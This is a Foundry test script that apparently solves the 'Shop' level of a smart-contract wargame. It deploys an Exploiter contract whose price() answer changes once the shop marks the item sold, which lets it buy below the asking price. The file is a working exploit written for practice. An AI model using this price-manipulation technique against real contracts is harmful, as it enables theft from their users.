pragma solidity ^0.8.0;
import "../instances/Ilevel21.sol";
import "forge-std/Test.sol";

contract Level21 is Test {
    Shop level21 = Shop(0x0Dac0CFBBE410c90F6dE97DA736FB592c8a209D1);

    function test() external {
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(attackerPrivateKey);
        Exploiter exploiter = new Exploiter(address(level21));
        exploiter.buy();
        require(
            level21.isSold() == true && level21.price() < 100,
            "not solved"
        );
        vm.stopBroadcast();
    }
}

contract Exploiter {
    Shop shop;

    constructor(address _shop) {
        shop = Shop(_shop);
    }

    function buy() public payable {
        shop.buy();
    }

    function price() public returns (uint256) {
        if (shop.isSold() == false) {
            return shop.price() + 1;
        } else {
            0;
        }
    }
}
